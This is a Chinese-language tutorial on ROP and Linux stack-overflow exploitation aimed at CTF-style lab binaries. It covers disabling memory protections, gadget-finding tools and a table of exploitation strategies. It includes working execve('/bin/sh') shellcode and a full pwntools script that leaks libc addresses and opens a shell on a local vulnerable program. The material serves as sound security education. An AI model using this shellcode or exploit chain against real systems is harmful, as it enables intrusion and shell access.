<!-- TOC -->

- [1. 概述](#1-概述)
    - [1.1. 参考资料](#11-参考资料)
    - [1.2. 程序流劫持（Control Flow Hijack）](#12-程序流劫持control-flow-hijack)
    - [1.3. 系统防御](#13-系统防御)
    - [1.4. ROP的概念](#14-rop的概念)
- [2. 准备工作](#2-准备工作)
    - [2.1. 设置coredump](#21-设置coredump)
    - [2.2. 解除安全措施的方法](#22-解除安全措施的方法)
    - [2.3. 将程序绑定到端口：SOCAT](#23-将程序绑定到端口socat)
    - [2.4. 32位库](#24-32位库)
    - [2.5. shellcode](#25-shellcode)
        - [2.5.1. 32位](#251-32位)
            - [2.5.1.1. 21字节系统调用](#2511-21字节系统调用)
        - [2.5.2. 64位](#252-64位)
- [3. 工具](#3-工具)
    - [3.1. gadgets工具](#31-gadgets工具)
        - [3.1.1. ROPgadget](#311-ropgadget)
    - [3.2. pwntools](#32-pwntools)
    - [3.3. EDB](#33-edb)
    - [3.4. objdump](#34-objdump)
    - [3.5. GDB](#35-gdb)
    - [3.6. 其它](#36-其它)
- [4. 思路总结](#4-思路总结)
    - [4.1. 利用步骤](#41-利用步骤)
    - [4.2. 方案表](#42-方案表)
    - [4.3. x64位的注意事项](#43-x64位的注意事项)
- [5. 通用gadgets](#5-通用gadgets)
    - [5.1. __libc_csu_init](#51-__libc_csu_init)
    - [5.2. _dl_runtime_resolve](#52-_dl_runtime_resolve)
    - [5.3. 一个Tips](#53-一个tips)

<!-- /TOC -->
# 1. 概述
## 1.1. 参考资料
* 蒸米的《一步一步学ROP》系列文章
* 《Linux PWN从入门到熟练》系列文章
## 1.2. 程序流劫持（Control Flow Hijack）
通过程序流劫持（如栈溢出，格式化字符串攻击和堆溢出），攻击者可以控制PC指针从而执行目标代码。
## 1.3. 系统防御
为了应对程序流劫持，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。
## 1.4. ROP的概念
ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御。
# 2. 准备工作
## 2.1. 设置coredump
可以防止出现程序在GDB调试环境下的内存地址与实际运行环境下内存地址不同的情况。
```bash
# 开启coredump
ulimit -c unlimited
sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'
# 调试coredump文件，第一个xxx为可执行文件名，第二个xxx为coredump文件名
gdb xxx /tmp/core.xxx
```
## 2.2. 解除安全措施的方法
* GCC编译选项：`-fno-stack-protector`，用于关闭栈保护
* GCC编译选项：`-z execstack`，用于关闭DEP
* shell指令：`echo 0 > /proc/sys/kernel/randomize_va_space`，用于关闭ASLR，设置为2为启用ASLR
* GCC编译选项：`-no-pie`，用于关闭PIE（程序基址版本的ASLR）
## 2.3. 将程序绑定到端口：SOCAT
`socat TCP4-LISTEN:10001,fork EXEC:./level1`，SOCAT可以将目标程序作为一个服务绑定到服务器的某个端口上
## 2.4. 32位库
如果要在64位环境下调试32位程序，需要安装32位相关的库函数：
```bash
sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386
# 如果是比较老的版本，可以用下面的命令
sudo apt-get install ia32-libs
# gcc编译32位程序
gcc -m32 1.c
```
## 2.5. shellcode
### 2.5.1. 32位
#### 2.5.1.1. 21字节系统调用
```python
# shellcode最后的功能相当于execve ("/bin/sh") 
# xor ecx, ecx      ;清零ecx
# mul ecx           ;ecx*eax，清零eax和edx
# push ecx          ;压栈0
# push 0x68732f2f   ;; hs//
# push 0x6e69622f   ;; nib/
# mov ebx, esp      ;ebx指向/bin//sh，为参数
# mov al, 11        ;系统调用
# int 0x80
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
```
### 2.5.2. 64位
# 3. 工具
## 3.1. gadgets工具
* objdump（可用于寻找简单gadgets）：kali Linux自带
* ROPEME: https://github.com/packz/ropeme
* Ropper: https://github.com/sashs/Ropper
* ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master
* rp++: https://github.com/0vercl0k/rp
### 3.1.1. ROPgadget
Kali Linux自带该款工具：
* ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi
* ROPgadget --binary libc.so.6 --string '/bin/sh'
## 3.2. pwntools
python库，可以极大的简化pwn的工作量。
* 寻找bin文件中的字符串：next(ELF('libc.so.6').search('/bin/sh'))
* 获取bin文件中函数地址（该地址为展开后函数实际地址，一般用于计算函数偏移）：ELF('libc.so.6').symbols['system']
* 寻找bin文件中plt表和got表中对应函数的地址（plt利用方式为`call/jmp addr_plt`，got利用方式为`call/jmp [addr_got]`）：ELF('libc.so.6').plt['system']；ELF('libc.so.6').got['system']
* 内存泄露：可用于获取函数地址，无法获取字符串
## 3.3. EDB
EDB调试器，Linux下的GUI调试器，对标OD。
## 3.4. objdump
* 查看可执行文件中的plt表：`objdump -d -j .plt level2`
* 查看可执行文件中的got表：`objdump -R level2`
## 3.5. GDB
* `print system`：获取函数地址
* `find 0xb7e393f0, +2200000, "/bin/sh"`：找到字符串（0xb7e393f0是通过print指令确定的`__libc_start_main`函数地址）
## 3.6. 其它
* checksec：检查程序的被保护情况
* ldd：可以查看目标程序调用的so库在哪里
* readelf：可以查看elf文件各个段的属性
# 4. 思路总结
## 4.1. 利用步骤
* 通过`checksec`等手段检查保护情况：系统ASLR、POE、Canary、DEP
* 判断漏洞函数，如gets、scanf、read等（注意：gets函数读取输入以换行符结束，read函数则指定了读取长度）
* 计算目标变量的在堆栈中距离ebp的偏移
* 分析是否已经载入了可以利用的函数，如system，execve等
* 分析是否有字符串/bin/sh，如果没有的话可以利用gets、read等函数写入.bss段（注意：gets函数读取输入以换行符结束，read函数则指定了读取长度）
## 4.2. 方案表
表格内容空白代表有或者无均无影响。
|系统ASLR|PIE|Canary|DEP|system函数|/bin/sh字符串|gets等写入函数|其它条件|手法|
|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
||No|No|||||程序中存在system('/bin/sh')调用|返回到system('/bin/sh')调用|
||No|No|||存在||程序中存在pop_pop_pop_pop_int的gadgets和/bin/sh字符串|利用gasgets进入系统调用|
||No|No||导入|存在|||返回到system函数，以/bin/sh字符串为参数|
||No|No|||存在|导入|程序中存在pop_ret的gadgets|将/bin/sh字符串写入.bss段，利用pop_ret平衡堆栈，返回到system函数，以/bin/sh字符串为参数|
||No|No|开启|导入|存在||不开启ASLR|返回到system函数，以/bin/sh字符串为参数|
|不开启||No|No|||||利用库中的JMP ESP指令，返回栈中执行|
||No|No|No|||||利用程序本体中的JMP ESP指令，返回栈中执行|
|开启|No|No|开启|存在|存在||拥有目标程序so库|通过plt或got中的write函数打印so库中某些函数地址，通过偏移计算出`system`函数和`/bin/sh`字符串在内存中的地址|
||No|No|No||||无目标服务器so库|通过read函数将/bin/sh字符串写入bss段（用于保存全局变量，地址固定，并且可以读可写）|
## 4.3. x64位的注意事项
* 内存地址范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常
* 函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上
# 5. 通用gadgets
因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。默认gcc还会有如下自动编译进去的函数可以用来查找gadgets。
```
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
```
## 5.1. __libc_csu_init
一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。
```python
# encoding:utf-8
# objdump -d ./level5观察到的__libc_csu_init()
"""
  4011c8:       4c 89 f2                mov    %r14,%rdx
  4011cb:       4c 89 ee                mov    %r13,%rsi
  4011ce:       44 89 e7                mov    %r12d,%edi
  4011d1:       41 ff 14 df             callq  *(%r15,%rbx,8)
  4011d5:       48 83 c3 01             add    $0x1,%rbx
  4011d9:       48 39 dd                cmp    %rbx,%rbp
  4011dc:       75 ea                   jne    4011c8 <__libc_csu_init+0x38>
  4011de:       48 83 c4 08             add    $0x8,%rsp
  4011e2:       5b                      pop    %rbx
  4011e3:       5d                      pop    %rbp
  4011e4:       41 5c                   pop    %r12
  4011e6:       41 5d                   pop    %r13
  4011e8:       41 5e                   pop    %r14
  4011ea:       41 5f                   pop    %r15
  4011ec:       c3                      retq   
"""
from pwn import *
# 打开文件
libc = ELF('libc.so.6')
elf = ELF('level5')
p = process('./level5')
# 获取system函数的地址偏移
got_write = elf.got['write']
got_read = elf.got['read']
main_addr = 0x401153
p.recvuntil("\n")
# 通过漏洞利用打印出write函数的内存地址
# 136填充+返回地址+rbx+rbp+r12(rdi)+r13(rsi)+r14(rdx)+r15+retq
raw_input("")
payload1 = "A" * 136 + p64(0x4011e2) + p64(0) + p64(1) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(0x4011c8)
# 填充栈，返回主函数
payload1 += ("A" * 56 + p64(main_addr))
p.send(payload1)
write_addr = u64(p.recv(8))
print "write address:" + hex(write_addr)
system_addr = write_addr + (libc.symbols["system"] - libc.symbols["write"])
print "system address:" + hex(system_addr)
p.recvuntil("\n")
# 发送第二段payload，写入binsh
bss_addr = 0x0000000000404038
payload2 = "A" * 136 + p64(0x4011e2) + p64(0) + p64(1) + p64(0) + p64(bss_addr) + p64(16) + p64(got_read) + p64(0x4011c8)
# 填充栈，返回主函数
payload2 += ("A" * 56 + p64(main_addr))
p.send(payload2)
p.send(p64(system_addr))
p.send("/bin/sh\0")
p.recvuntil("\n")
# 发送第三段payload，执行
payload3 = "A" * 136 + p64(0x4011e2) + p64(0) + p64(1) + p64(bss_addr+8) + p64(0) + p64(0) + p64(bss_addr) + p64(0x4011c8)
p.send(payload3)
p.interactive()
```
## 5.2. _dl_runtime_resolve
通过这个gadget可以控制六个64位参数寄存器的值，当我们使用参数比较多的函数的时候（比如mmap和mprotect）就可以派上用场了。
## 5.3. 一个Tips
另外，通过控制PC跳转到某些经过稍微偏移过的地址（会改变程序原来的汇编代码）会得到意想不到的效果。
